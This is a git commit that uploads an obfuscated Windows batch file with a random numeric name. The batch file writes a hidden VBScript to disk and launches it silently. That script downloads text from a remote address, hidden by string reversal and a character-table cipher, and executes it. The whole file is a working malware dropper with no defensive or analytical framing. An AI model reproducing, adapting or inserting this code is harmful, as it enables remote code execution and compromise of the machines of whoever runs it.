45501ede4523c8c4b87fb94eb5a441106ca36b4f
23jh4g1 <51272284+23jh4g1@users.noreply.github.com>
2019-06-12 01:16:03 -0300

    Add files via upload

---
+++ 92387489-923874-2391.cmd
@@ -0,0 +1,39 @@
+@echo off
+setlocal EnableExtensions DisableDelayedExpansion
+md "%ALLUSERSPROFILE%\.pppDA\" && cls
+set jfBCosU1=%USERNAME%.vbs
+set bDbTkhCP=9M/kIyGgpW2aev=Ht8L.cq:Amix3nwdsouXzYCFVl5ZD-0rNh1Rj6b
+set i8PKuSHuov="%ALLUSERSPROFILE%\.pppDA\%jfBCosU1%" ECHO
+del i8PKuSHuov="%ALLUSERSPROFILE%\.pppDA\%jfBCosU1%
+:Fase1
+>>%i8PKuSHuov% Dim bDk0Iad6GcqtU7jk
+>>%i8PKuSHuov% Dim cwTmXpancbt
+>>%i8PKuSHuov% Dim dHL7vOwf1k9
+>>%i8PKuSHuov% Dim eq3D1Xd6UDhyLUcGP
+>>%i8PKuSHuov% Dim fJ9UwFdI
+>>%i8PKuSHuov% Dim gqfaEfE47RhVX
+>>%i8PKuSHuov% Dim hG2gTDNkr5azL
+>>%i8PKuSHuov% cwTmXpancbt = WScript.Arguments(0)
+>>%i8PKuSHuov% dHL7vOwf1k9 = WScript.Arguments(1)
+>>%i8PKuSHuov% Set mBFdOHwEGmI = CreateObject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
+>>%i8PKuSHuov% Set pT7DSWHYVyRKPJ = CreateObject(StrReverse("llehS.tpircSW"))
+>>%i8PKuSHuov% Dir = pT7DSWHYVyRKPJ.ExpandEnvironmentStrings("%USERPROFILE%")
+>>%i8PKuSHuov% If Not mBFdOHwEGmI.FolderExists(Dir + "\" + ".wX") Then
+>>%i8PKuSHuov% Set nUWyoEE4D = mBFdOHwEGmI.CreateFolder(Dir + "\" + ".wX")
+>>%i8PKuSHuov% Set bDk0Iad6GcqtU7jk = CreateObject(StrReverse("PTTHLMX.2LMXSM"))
+>>%i8PKuSHuov% bDk0Iad6GcqtU7jk.open StrReverse(cwTmXpancbt), dHL7vOwf1k9, False
+>>%i8PKuSHuov% execute("bDk0Iad6GcqtU7jk.setRequestHeader ""User-Agent"", ""3M4yC5u8stom2U8se4r"":bDk0Iad6GcqtU7jk.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded""")
+>>%i8PKuSHuov% execute("bDk0Iad6GcqtU7jk.send :eq3D1Xd6UDhyLUcGP = bDk0Iad6GcqtU7jk.responseText")
+>>%i8PKuSHuov% execute( eq3D1Xd6UDhyLUcGP )
+>>%i8PKuSHuov% WScript.Sleep(3000)
+>>%i8PKuSHuov% Set oxX7IXTCsPzp = CreateObject(StrReverse("PTTHLMXrevreS.2LMXSM"))
+>>%i8PKuSHuov% oxX7IXTCsPzp.open StrReverse("TEG"), StrReverse("gpj.sserpahloF_seuqraM-oehT_otoF/60/9102/selif/731/sgolb/rb.moc.lougmi.oduetnoc//:sptth"), False
+>>%i8PKuSHuov% oxX7IXTCsPzp.send()
+>>%i8PKuSHuov% End If
+cls
+@echo off
+ping 127.0.0.1 -n 1 > nul
+set lamLp69p=%bDbTkhCP:~48,1%%bDbTkhCP:~16,1%%bDbTkhCP:~16,1%%bDbTkhCP:~8,1%%bDbTkhCP:~31,1%%bDbTkhCP:~22,1%%bDbTkhCP:~2,1%%bDbTkhCP:~2,1%%bDbTkhCP:~8,1%%bDbTkhCP:~16,1%%bDbTkhCP:~44,1%%bDbTkhCP:~53,1%%bDbTkhCP:~46,1%%bDbTkhCP:~19,1%%bDbTkhCP:~32,1%%bDbTkhCP:~32,1%%bDbTkhCP:~7,1%%bDbTkhCP:~33,1%%bDbTkhCP:~5,1%%bDbTkhCP:~19,1%%bDbTkhCP:~20,1%%bDbTkhCP:~32,1%%bDbTkhCP:~24,1%%bDbTkhCP:~2,1%%bDbTkhCP:~11,1%%bDbTkhCP:~8,1%%bDbTkhCP:~8,1%%bDbTkhCP:~3,1%%bDbTkhCP:~20,1%%bDbTkhCP:~24,1%%bDbTkhCP:~30,1%%bDbTkhCP:~2,1%%bDbTkhCP:~11,1%%bDbTkhCP:~15,1%%bDbTkhCP:~50,1%%bDbTkhCP:~45,1%%bDbTkhCP:~20,1%%bDbTkhCP:~15,1%%bDbTkhCP:~1,1%%bDbTkhCP:~52,1%%bDbTkhCP:~18,1%%bDbTkhCP:~5,1%%bDbTkhCP:~0,1%%bDbTkhCP:~35,1%%bDbTkhCP:~30,1%%bDbTkhCP:~6,1%%bDbTkhCP:~0,1%%bDbTkhCP:~5,1%%bDbTkhCP:~36,1%%bDbTkhCP:~9,1%%bDbTkhCP:~30,1%%bDbTkhCP:~40,1%%bDbTkhCP:~18,1%%bDbTkhCP:~24,1%%bDbTkhCP:~30,1%%bDbTkhCP:~13,1%%bDbTkhCP:~53,1%%bDbTkhCP:~10,1%%bDbTkhCP:~30,1%%bDbTkhCP:~31,1%%bDbTkhCP:~42,1%%bDbTkhCP:~9,1%%bDbTkhCP:~38,1%%bDbTkhCP:~29,1%%bDbTkhCP:~11,1%%bDbTkhCP:~34,1%%bDbTkhCP:~1,1%%bDbTkhCP:~33,1%%bDbTkhCP:~36,1%%bDbTkhCP:~10,1%%bDbTkhCP:~0,1%%bDbTkhCP:~16,1%%bDbTkhCP:~18,1%%bDbTkhCP:~10,1%%bDbTkhCP:~47,1%%bDbTkhCP:~13,1%%bDbTkhCP:~53,1%%bDbTkhCP:~28,1%%bDbTkhCP:~47,1%%bDbTkhCP:~13,1%%bDbTkhCP:~53,1%%bDbTkhCP:~6,1%%bDbTkhCP:~39,1%%bDbTkhCP:~51,1%%bDbTkhCP:~53,1%%bDbTkhCP:~6,1%%bDbTkhCP:~0,1%%bDbTkhCP:~49,1%%bDbTkhCP:~42,1%%bDbTkhCP:~37,1%%bDbTkhCP:~0,1%%bDbTkhCP:~24,1%%bDbTkhCP:~53,1%%bDbTkhCP:~10,1%%bDbTkhCP:~26,1%%bDbTkhCP:~3,1%%bDbTkhCP:~42,1%%bDbTkhCP:~34,1%%bDbTkhCP:~4,1%%bDbTkhCP:~16,1%%bDbTkhCP:~11,1%%bDbTkhCP:~24,1%%bDbTkhCP:~7,1%%bDbTkhCP:~13,1%%bDbTkhCP:~12,1%%bDbTkhCP:~9,1%%bDbTkhCP:~26,1%%bDbTkhCP:~21,1%%bDbTkhCP:~1,1%%bDbTkhCP:~34,1%%bDbTkhCP:~38,1%%bDbTkhCP:~16,1%%bDbTkhCP:~30,1%%bDbTkhCP:~43,1%%bDbTkhCP:~40,1%%bDbTkhCP:~29,1%%bDbTkhCP:~20,1%%bDbTkhCP:~25,1%%bDbTkhCP:~41,1%%bDbTkhCP:~25,1%%bDbTkhCP:~53,1%%bDbTkhCP:~34,1%%bDbTkhCP:~23,1%%bDbTkhCP:~24,1%%bDbTkhCP:~53,1%%bDbTkhCP:~24,1%%bDbTkhCP:~17,1%%bDbTkhCP:~16,1%%bDbTkhCP:~20,1%%bDbTkhCP:~6,1%%bDbTkhCP:~0,1%%bDbTkhCP:~27,1%%bDbTkhCP:~42,1%%bDbTkhCP:~34,1%%bDbTkhCP:~4,1%%bDbTkhCP:~14,1%
+start wscript //Nologo "%ALLUSERSPROFILE%\.pppDA\%jfBCosU1%" AS111 %lamLp69p% && @echo off
+endlocal
+:h2ShI7oxso
